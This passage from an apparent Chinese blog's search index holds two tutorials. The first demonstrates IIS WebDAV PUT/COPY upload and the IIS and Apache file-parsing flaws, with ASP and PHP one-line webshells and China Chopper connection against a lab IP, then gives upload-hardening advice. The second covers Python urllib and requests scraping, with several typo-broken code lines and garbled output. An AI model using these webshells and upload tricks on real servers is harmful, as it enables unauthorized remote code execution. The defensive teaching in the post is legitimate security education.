截断对应数据包，修改对应的方法OPTIONS进行探测，如果返回了200，并且返回了对应的支持方法，这个时候可以判断他是支持IIS PUT 探测完就要上传一个文本 在红线处将OPTIONS改为PUT/123.txt，在紫色下划线地方写入asp脚本 1&lt;%@eval request(&quot;cmd&quot;))%&gt; 修改为配置点击GO，这样根目录下就会多一个123.txt文本，也可以在右面response中看到HTTP相应是201也就是创建 在根目录查看是否有一个123.txt，如果有查看123.txt中的内容 发现确实凡在，并且内容也是asp脚本内容 上传完成之后就需要进行MOVE重命名或者COPY拷贝 打开网址输入网址的URL进行抓包，将其配置信息修改 将GET修改为COPY，拷贝的内容是123.txt，可以将Host以下的内容全部删除 写入Destination：URL 1Destination：http:&#x2F;&#x2F;192.168.1.110&#x2F;123.asp;aaa.jpg 点击GO进行执行，返回HTTP201表示完成 查看根目录下是否有这个文件，发现文件确实存在，说明执行成功 当然也可以改为其他名称，但要符合解析漏洞的内容 以上代码存在错误，已在开头表明，这里已经修改完成使用菜刀进行连接，成功连接 Apache文件解析漏洞1、Apache环境搭建Apache和PHP采用module的方式结合 只有Apache和php采用moudule的方式来进行结合时才有解析漏洞，虽然可以和其他的结合但是不存在解析漏洞 这样就需要下载单独的Apache和PHP，在Apache下hettpd.conf文件，将对应的PHP文件加载进来 安装完Apache后在文件夹下的conf中的httpd.conf进行配置 加载对应的模块LoadModule php5_module “路径”将文件中在带的dll进行加载 设置PHP初始化目录PHPIniDir “目录” 以及对一些文件进行解析AddType application/x-httpd-php .php .html .htm，加上这些后缀名是只对这些后缀名进行解析 如果使用这种情况，会出现错误的 2、Apache解析漏洞介绍因为Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名不可识别的，就继续往左判断，直到判断到文件名为止 官方解释：http://httpd.apache.org/docs/current/mod/directive-dict.html 比如：1.php.xxxx 这个文件有两个文件后缀名，一个是php一个是xxxx，当Apache从右向左进行解析时，先解析后缀名.xxxx发现不然是继续向左解析，解析到.php，Apache认识就会当做PHP解析 注意：Apache本身是不能解析php文件，而是调用php模块来解析php文件，Apache只是判断这个文件是不是php如果是就交给php模块解析，Apache本身不具有解析功能，只是判断文件类型。3、解析漏洞利用演示在站点目录下新建一个1.php.xxxx文件，xxxx文件后缀名为无法识别的后缀名。其中内容为phpinfo(); 在Apache下的htdocs下新建一个1.php .xxxx 打开cmd使用ipconfig获取ip地址 在浏览器当中进行访问，这样就会输出对应的phpinfo，由此可以确定这个文件会被Apache当做php文件格式，并传递给php.exe进行执行 传递到这里，进行执行 4、利用场景介绍在Web程序总存在文件上传，但是有黑名单验证时，利用该解析漏洞可以上传对应各WebShell到目标服务器 比如： 传递一句话木马，使用菜刀连接 123&lt;?php @vale($_POST[&#39;cmd&#39;]);?&gt; 例如使用1.php.xxxx的文件内容修改为一句话木马，然后使用中国菜刀进行连接，连接时同样是这个文件，但是会被Apache当做php来进行判断，判断它为php文件，这时候就会调用php.exe进行解析，然后就成功连接到中国菜刀的一句话WebShell 文件上传修复建议 通过白名单的方式判断文件后缀名是否合法 对上传的文件名进行重命名。 例如： rand(10,99).date(&quot;YmdHis&quot;).&quot;.jpg&quot;。 设计安全的文件上传功能1、文件上传的目录设置为不可执行只要web容器无法解析该目录下的内容，即使攻击者上传了脚本文件，服务器本身也不会收到影响，因此此点至关重要。在实际应用中，很多大型网站的上传应用，文件上传后会放到独立的存储上做静态文件处理，一方面方便使用缓存加速，降低性能损耗；另一方面也杜绝了脚本执行的可能。 2、判断文件类型在判断文件类型时，可以结合使用MIME Type、后缀名检查等方法。在文件类型检查中，强烈推荐使用白名单，黑名单的方式不可靠。对于图片的处理，可以使用压缩函数resize()函数，在处理图片的同时破坏图片中可能包含的HTML代码。 3、使用随机数该写文件名和文件路径文件上传如果要执行代码，则需要用户能够访问到这个文件，在某些环境中，用户能上传，但不能访问，如果应用使用随机数改写了文件的路径，将极大地增加了攻击的成本。与此同时，像shell.php.rar.rar这种文件，或者是crossdomain.xml这种文件，都将因为文件名被改写而无法成功实施攻击 4、单独设置文件服务器的域名由于浏览器同资源策略的关系，一系列客户端攻击将失效，比如上传rossdomain.xml、上传包含JavaScript的XSS利用等问题将得到解决 当然这只是简单的文件上传预防，如果还要考虑病毒、木马、色情图片与视频，反政治文件等等，需要做的就非常多了，文件上传看似简单，但要实现一个安全的上传功能是非常不容易的","categories":[],"tags":[]},{"title":"python爬虫","slug":"python爬虫","date":"2020-04-03T06:36:06.840Z","updated":"2020-04-03T09:16:15.826Z","comments":true,"path":"2020/04/03/python爬虫/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/python%E7%88%AC%E8%99%AB/","excerpt":"","text":"Response响应状态200代表成功、301表示跳转、404找不到页面、502服务器错误 响应头如内容类型、内容长度、服务器信息、设置Cookie等 响应体主要部分，包含了请求资源的内容、如网页HTML、图片二进制数据等 我们在做爬虫时可以用一些HTTP请求库，然后向服务器发送一个请求，得到这个Response,然后把这个响应体里面的内容拿下来，这个实际上就是网页的源代码，然后我们再把这个网页的源代码，进行解析，就可以拿到我们的数据了，模拟请求 123456789101112131415161718192021222324252627282930313233&gt;&gt;&gt; import requests#调用requests.get方法传入百度这个网址，这个也就是HTTP请求的发送，拿到这个响应#也就是说，requests库提供了get方法，我们传入这个URL也就是百度网址，就可以向服务器发送一个请求，然后拿到这个response&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;)#打印response.text然后这个text就是把网页的源代码，也就是响应体拿过来&gt;&gt;&gt; print(response.text)#成功的获取到了这些网页的源代码，接下来就可以对网页进行解析了&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv&#x3D;content-type content&#x3D;text&#x2F;html;charset&#x3D;utf-8&gt;&lt;meta http-equiv&#x3D;X-UA-Compatible content&#x3D;IE&#x3D;Edge&gt;&lt;meta content&#x3D;always name&#x3D;referrer&gt;&lt;link rel&#x3D;stylesheet type&#x3D;text&#x2F;css href&#x3D;http:&#x2F;&#x2F;s1.bdstatic.com&#x2F;r&#x2F;www&#x2F;cache&#x2F;bdorz&#x2F;baidu.min.css&gt;&lt;title&gt;ç¾åº¦ä¸ä¸ï¼ä½ å°±ç¥é&lt;&#x2F;title&gt;&lt;&#x2F;head&gt; &lt;body link&#x3D;#0000cc&gt; &lt;div id&#x3D;wrapper&gt; &lt;div id&#x3D;head&gt; &lt;div class&#x3D;head_wrapper&gt; &lt;div class&#x3D;s_form&gt; &lt;div class&#x3D;s_form_wrapper&gt; &lt;div id&#x3D;lg&gt; &lt;img hidefocus&#x3D;true src&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png width&#x3D;270 height&#x3D;129&gt; &lt;&#x2F;div&gt; &lt;form id&#x3D;form name&#x3D;f action&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;s class&#x3D;fm&gt; &lt;input type&#x3D;hidden name&#x3D;bdorz_come value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;ie value&#x3D;utf-8&gt; &lt;input type&#x3D;hidden name&#x3D;f value&#x3D;8&gt; &lt;input type&#x3D;hidden name&#x3D;rsv_bp value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;rsv_idx value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;tn value&#x3D;baidu&gt;&lt;span class&#x3D;&quot;bg s_ipt_wr&quot;&gt;&lt;input id&#x3D;kw name&#x3D;wd class&#x3D;s_ipt value maxlength&#x3D;255 autocomplete&#x3D;off autofocus&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;bg s_btn_wr&quot;&gt;&lt;input type&#x3D;submit id&#x3D;su value&#x3D;ç¾åº¦ä¸ä¸ class&#x3D;&quot;bg s_btn&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div id&#x3D;u1&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;news.baidu.com name&#x3D;tj_trnews class&#x3D;mnav&gt;æ°é»&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;www.hao123.com name&#x3D;tj_trhao123 class&#x3D;mnav&gt;hao123&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;map.baidu.com name&#x3D;tj_trmap class&#x3D;mnav&gt;å°å¾&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;v.baidu.com name&#x3D;tj_trvideo class&#x3D;mnav&gt;è§é¢&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;tieba.baidu.com name&#x3D;tj_trtieba class&#x3D;mnav&gt;è´´å§&lt;&#x2F;a&gt; &lt;noscript&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;bdorz&#x2F;login.gif?login&amp;tpl&#x3D;mn&amp;u&#x3D;http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1 name&#x3D;tj_login class&#x3D;lb&gt;ç»å½&lt;&#x2F;a&gt; &lt;&#x2F;noscript&gt; &lt;script&gt;document.write(&#39;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&#x2F;bdorz&#x2F;login.gif?login&amp;tpl&#x3D;mn&amp;u&#x3D;&#39;+ encodeURIComponent(window.location.href+ (window.location.search &#x3D;&#x3D;&#x3D; &quot;&quot; ? &quot;?&quot; : &quot;&amp;&quot;)+ &quot;bdorz_come&#x3D;1&quot;)+ &#39;&quot; name&#x3D;&quot;tj_login&quot; class&#x3D;&quot;lb&quot;&gt;ç»å½&lt;&#x2F;a&gt;&#39;);&lt;&#x2F;script&gt; &lt;a href&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;more&#x2F; name&#x3D;tj_briicon class&#x3D;bri style&#x3D;&quot;display: block;&quot;&gt;æ´å¤äº§å&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div id&#x3D;ftCon&gt; &lt;div id&#x3D;ftConw&gt; &lt;p id&#x3D;lh&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;home.baidu.com&gt;å³äºç¾åº¦&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;ir.baidu.com&gt;About Baidu&lt;&#x2F;a&gt; &lt;&#x2F;p&gt; &lt;p id&#x3D;cp&gt;&amp;copy;2017&amp;nbsp;Baidu&amp;nbsp;&lt;a href&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;duty&#x2F;&gt;ä½¿ç¨ç¾åº¦åå¿è¯»&lt;&#x2F;a&gt;&amp;nbsp; &lt;a href&#x3D;http:&#x2F;&#x2F;jianyi.baidu.com&#x2F; class&#x3D;cp-feedback&gt;æè§åé¦&lt;&#x2F;a&gt;&amp;nbsp;äº¬ICPè¯030173å·&amp;nbsp; &lt;img src&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;gs.gif&gt; &lt;&#x2F;p&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;#打印响应头，是字典状态&gt;&gt;&gt; print(response.headers)&#123;&#39;Cache-Control&#39;: &#39;private, no-cache, no-store, proxy-revalidate, no-transform&#39;, &#39;Connection&#39;: &#39;keep-alive&#39;, &#39;Content-Encoding&#39;: &#39;gzip&#39;, &#39;Content-Type&#39;: &#39;text&#x2F;html&#39;, &#39;Date&#39;: &#39;Mon, 27 Jan 2020 05:20:09 GMT&#39;, &#39;Last-Modified&#39;: &#39;Mon, 23 Jan 2017 13:27:32 GMT&#39;, &#39;Pragma&#39;: &#39;no-cache&#39;, &#39;Server&#39;: &#39;bfe&#x2F;1.0.8.18&#39;, &#39;Set-Cookie&#39;: &#39;BDORZ&#x3D;27315; max-age&#x3D;86400; domain&#x3D;.baidu.com; path&#x3D;&#x2F;&#39;, &#39;Transfer-Encoding&#39;: &#39;chunked&#39;&#125;#打印相应状态，200表示成功，也就是正常的请求了百度&gt;&gt;&gt; print(response.status_code)200&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;)#重新的发起一次请求，这次请求就携带了headers信息&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;,headers&#x3D;headers)#在这里将响应打印，发现响用的状态码还是200，表示这次请求也是成功的&gt;&gt;&gt; print(response.status_code)200 爬虫可以抓取怎么的数据1、网页文本：如HTML文档、Json格式文本等2、图片：获取到的是二进制文件，保存为图片格式。12345678910111213爬取图片&gt;&gt;&gt; import requests#用request中的get获得这个图片的URL&gt;&gt;&gt; response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;baidu_resultlogo@2.png&#39;)#以二进制形式打印response的内容出来&gt;&gt;&gt; print(response.content)#打开要保存图片的磁盘，给图片命名，以写入的方式打开二进制，&gt;&gt;&gt; with open(&#39;D:&#x2F;&#x2F;1.gif&#39;,&#39;wb&#39;) as f: #写入response的内容 f.write(response.content) #关闭文件 f.close() 3、视频：同为二进制文件，保存为视频格式即可。4、其他：只要是能请求到的，都能获取解析方式1、直接处理2、Json解析3、正则表达式4、BeautifulSoup 5、PyQuery 6、XPath 为什么我抓到的和浏览器看到的不一样怎样解决JavaScript渲染问题 分析 Ajax请求 selenium/webdriver 怎样保存数据1、文本：纯文本，Json，Xml等 2、关系型数据库：MySQL、Oracle、SQLServer等具有结构化表结构形式存储 3、非关系型数据库：MongoDB、Redis等Key-Value形式存储 4、二进制文件：图片，视频，音频等直接保存成特定格式即可 Urllib库python内置的HTTP请求库urllib.request 请求模块urllib.error 异常处理模块urllib.parse url解析模块urllib.robotparser rebots.txt解析模块把网页请求下来urllib.request.urlopen()1234567import urllib.request#请求打开百度这个网站，将数据赋值给responesrespones &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)#阅读百度源代码print(respones.read().decode(&quot;utf-8&quot;)) 12345678import urllib.parseimport urllib.requestdata &#x3D; bytes(urllib.parse.urlencode(&#123;&#39;word&#39;:&#39;hello&#39;&#125;),encoding &#x3D; &#39;utf-8&#39;)respones &#x3D; urllib.request.urlopen(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data)print(respones.read())b&#39;&#123;\\n &quot;args&quot;: &#123;&#125;, \\n &quot;data&quot;: &quot;&quot;, \\n &quot;files&quot;: &#123;&#125;, \\n &quot;form&quot;: &#123;\\n &quot;word&quot;: &quot;hello&quot;\\n &#125;, \\n &quot;headers&quot;: &#123;\\n &quot;Accept-Encoding&quot;: &quot;identity&quot;, \\n &quot;Content-Length&quot;: &quot;10&quot;, \\n &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, \\n &quot;Host&quot;: &quot;httpbin.org&quot;, \\n &quot;User-Agent&quot;: &quot;Python-urllib&#x2F;3.8&quot;, \\n &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2ed849-e71b483cf9d302cdd04052a1&quot;\\n &#125;, \\n &quot;json&quot;: null, \\n &quot;origin&quot;: &quot;112.226.8.246&quot;, \\n &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;\\n&#125;\\n&#39; 设置超时时间123456import urllib.requestresponse &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;,timeout &#x3D; 1)print(response.read())b&#39;&#123;\\n &quot;args&quot;: &#123;&#125;, \\n &quot;headers&quot;: &#123;\\n &quot;Accept-Encoding&quot;: &quot;identity&quot;, \\n &quot;Host&quot;: &quot;httpbin.org&quot;, \\n &quot;User-Agent&quot;: &quot;Python-urllib&#x2F;3.8&quot;, \\n &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2ed91e-9795fe0068ea47d0c32daea0&quot;\\n &#125;, \\n &quot;origin&quot;: &quot;112.226.8.246&quot;, \\n &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;\\n&#125;\\n&#39; 响应响应类型12 状态码123456import urllib.requestresponse &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)print(response.status)200 123456import urllib.requestresponse &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.python.org&quot;)#read就是获取响应体的内容，这个响应体的内容是要给字节流形式，然后用decode进行解码转成utf-8print(response.read().decode(&quot;utf-8&quot;)) Request12345import urllib.requestrequest &#x3D; urllib.request.Request(&quot;http:&#x2F;&#x2F;python.org&quot;)response &#x3D; urllib.request.urlopen(request)print(response.read()).decode(&#39;utf-8&#39;) 12345678910import urllib.request,parseurl &#x3D; &#39;网址&#39;headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;对应&#39;&#125;dict &#x3D; &#123;&#39;name&#39;:&#39;Germey&#39;&#125;data &#x3D; bytes(parse.urlencode(dict),encoding&#x3D;&quot;utf-8&quot;)req &#x3D; request.Request(url&#x3D;url,data&#x3D;data,headers&#x3D;header,method&#x3D;&#39;POST&#39;)response &#x3D; request.rulopen(req)print(response.read().decode(&#39;tuf-8&#39;)) Handler代理12345678可以伪装自己的IP地址，服务器识别的IP就是代理的ipimport urllib.requestproxy_handler &#x3D; rullib,request.ProxyHandler(&#123;&#39;http&#39;&#39;http:&#x2F;&#x2F;127.0.0.1:9743&#39;&#125;)opener &#x3D; urllib.reuqest.build_opener(proxy_handler)response &#x3D; opener.open(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;)pritn(response.read()) URL解析urlparse Requsets123456789101112# 导入 requests 模块&gt;&gt;&gt; import requests# 接收百度这个网址，传给变量response&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#x2F;&#39;)# 查看response格式&gt;&gt;&gt; print(type(response))# 打印response的状态码&gt;&gt;&gt; print(response.status_code)# 查看response的文本类型&gt;&gt;&gt; print(type(response.text))# 打印response文本&gt;&gt;&gt; print(response.text) 请求基本GET请求基本写法12345678这是最简单的get请求# 导入 requests 模块&gt;&gt;&gt;import requests# 请求接收 httpbin网址&gt;&gt;&gt; response &#x3D; requests.get(&quot;http:&#x2F;&#x2F;www.httpbin.org&#x2F;get&quot;)# 打印 response文本&gt;&gt;&gt; print(response.text) 带参数GET请求1234&gt;&gt;&gt; import requests# GET请求参数就要拼接到URL后面用？问好分隔，将参数传过来用&amp;分隔&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get?name&#x3D;germey&amp;age&#x3D;22&#39;)&gt;&gt;&gt; print(response.text) 以上方法是比较繁琐的，resquests提供了一个非常简单的参数。这个参数叫params 将params传入一个字典形式，这样也可以构造一个GET形式参数1234&gt;&gt;&gt; import requests&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germty&#39;,&#39;age&#39;:22&#125;&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;,params &#x3D; data)&gt;&gt;&gt; print(response.text) 解析json123456789&gt;&gt;&gt; import requests&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;)# 解析前 他是str格式&gt;&gt;&gt; print(type(response.text))&lt;class &#39;str&#39;&gt;&gt;&gt;&gt; print(response.json())# 解析后 他是dict格式&gt;&gt;&gt; print(type(response.json()))&lt;class &#39;dict&#39;&gt; 获取二进制数据12345678910# 导入模块&gt;&gt;&gt; import requests# 获取图片网址&gt;&gt;&gt; response &#x3D; request.get(&quot;https:&#x2F;&#x2F;images2017.cnblogs.com&#x2F;blog&#x2F;777527&#x2F;201712&#x2F;777527-20171206153020144-701297613.png&quot;)# 以二进制形式打开并保存图片路径&gt;&gt;&gt; wiht open(&quot;D:&#x2F;&#x2F;json.jpg&quot;,&quot;wb&quot;) as f:# 写入其二进制内容 f.write(response.content)# 关闭文件 f.close() 添加headers1234567891011如果不加headers会被网站屏蔽&gt;&gt;&gt; import requests&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.zhihu.com&#x2F;explore&#39;)&gt;&gt;&gt; print(response.text)&lt;html&gt;&lt;head&gt;&lt;title&gt;400 Bad Request&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;&quot;white&quot;&gt;&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;hr&gt;&lt;center&gt;openresty&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 12345加上headers就可以查看response的文本&gt;&gt;&gt; import requests&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.zhihu.com&#x2F;explore&#39;,headers &#x3D; headers)&gt;&gt;&gt; print(response.text) 基本POST请求12345678910111213141516171819202122232425262728293031# 导入模块&gt;&gt;&gt; import requests# 设置data参数&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germey&#39;,&#39;age&#39;:&#39;22&#39;&#125;# 进行post请求&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data,headers &#x3D; headers)# 打印response文本&gt;&gt;&gt; print(response.text)# 这里打印的文本是str格式&#123; &quot;args&quot;: &#123;&#125;, &quot;data&quot;: &quot;&quot;, &quot;files&quot;: &#123;&#125;, &quot;form&quot;: &#123; &quot;age&quot;: &quot;22&quot;, &quot;name&quot;: &quot;germey&quot; &#125;, &quot;headers&quot;: &#123; &quot;Accept&quot;: &quot;*&#x2F;*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Length&quot;: &quot;18&quot;, &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&quot;, &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2fdea2-a2bd0afafc4743c2926d9b9f&quot; &#125;, &quot;json&quot;: null, &quot;origin&quot;: &quot;112.226.8.246&quot;, &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;&#125; 12345678910111213# 导入模块&gt;&gt;&gt; import requests# 设置data参数&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germey&#39;,&#39;age&#39;:&#39;22&#39;&#125;# 设置headers&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;# 进行psot请求&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data,headers &#x3D; headers)# 解析response&gt;&gt;&gt; print(response.json())# 解析之后就变成了dick格式&#123;&#39;args&#39;: &#123;&#125;, &#39;data&#39;: &#39;&#39;, &#39;files&#39;: &#123;&#125;, &#39;form&#39;: &#123;&#39;age&#39;: &#39;22&#39;, &#39;name&#39;: &#39;germey&#39;&#125;, &#39;headers&#39;: &#123;&#39;Accept&#39;: &#39;*&#x2F;*&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Content-Length&#39;: &#39;18&#39;, &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;, &#39;Host&#39;: &#39;httpbin.org&#39;, &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;, &#39;X-Amzn-Trace-Id&#39;: &#39;Root&#x3D;1-5e2fde03-cae7a73c2ed8eed413526372&#39;&#125;, &#39;json&#39;: None, &#39;origin&#39;: &#39;112.226.8.246&#39;, &#39;url&#39;: &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;&#125; 响应response属性1234567891011121314&gt;&gt;&gt; import requests# 隐藏服务器，防止屏蔽&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.jianshu.com&#39;，headers &#x3D; headers)# 打印状态码&gt;&gt;&gt; print(type(response.status_code),response.status_code)# 打印headers&gt;&gt;&gt; print(type(response.headers),response.headers)# 打印cookies&gt;&gt;&gt; print(type(response.cookies),response.cookies)# 打印url网址&gt;&gt;&gt; print(type(response.url),response.url)# 打印history也就是历史清单&gt;&gt;&gt; print(type(response.history),response.history) 状态码判断123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869一些常见的状态码为：200 - 服务器成功返回网页 404 - 请求的网页不存在 503 - 服务不可用 详细分解：1xx（临时响应） 表示临时响应并需要请求者继续执行操作的状态代码。代码 说明 100 （继续） 请求者应当继续提出请求。服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。 101 （切换协议） 请求者已要求服务器切换协议，服务器已确认并准备切换。2xx （成功） 表示成功处理了请求的状态代码。代码 说明 200 （成功） 服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 201 （已创建） 请求成功并且服务器创建了新的资源。 202 （已接受） 服务器已接受请求，但尚未处理。 203 （非授权信息） 服务器已成功处理了请求，但返回的信息可能来自另一来源。 204 （无内容） 服务器成功处理了请求，但没有返回任何内容。 205 （重置内容） 服务器成功处理了请求，但没有返回任何内容。 206 （部分内容） 服务器成功处理了部分 GET 请求。3xx （重定向） 表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。代码 说明 300 （多种选择） 针对请求，服务器可执行多种操作。服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 301 （永久移动） 请求的网页已永久移动到新位置。服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。 302 （临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 303 （查看其他位置） 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。 304 （未修改） 自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。 305 （使用代理） 请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。 307 （临时重定向） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。4xx（请求错误） 这些状态代码表示请求可能出错，妨碍了服务器的处理。代码 说明 400 （错误请求） 服务器不理解请求的语法。 401 （未授权） 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。 403 （禁止） 服务器拒绝请求。 404 （未找到） 服务器找不到请求的网页。 405 （方法禁用） 禁用请求中指定的方法。 406 （不接受） 无法使用请求的内容特性响应请求的网页。 407 （需要代理授权） 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。 408 （请求超时） 服务器等候请求时发生超时。 409 （冲突） 服务器在完成请求时发生冲突。服务器必须在响应中包含有关冲突的信息。 410 （已删除） 如果请求的资源已永久删除，服务器就会返回此响应。 411 （需要有效长度） 服务器不接受不含有效内容长度标头字段的请求。 412 （未满足前提条件） 服务器未满足请求者在请求中设置的其中一个前提条件。 413 （请求实体过大） 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。 414 （请求的 URI 过长） 请求的 URI（通常为网址）过长，服务器无法处理。 415 （不支持的媒体类型） 请求的格式不受请求页面的支持。 416 （请求范围不符合要求） 如果页面无法提供请求的范围，则服务器会返回此状态代码。 417 （未满足期望值） 服务器未满足”期望”请求标头字段的要求。5xx（服务器错误） 这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。代码 说明 500 （服务器内部错误） 服务器遇到错误，无法完成请求。 501 （尚未实施） 服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。 502 （错误网关） 服务器作为网关或代理，从上游服务器收到无效响应。 503 （服务不可用） 服务器目前无法使用（由于超载或停机维护）。通常，这只是暂时状态。 504 （网关超时） 服务器作为网关或代理，但是没有及时从上游服务器收到请求。 505 （HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本。HttpWatch状态码Result is200 - 服务器成功返回网页，客户端请求已成功。 302 - 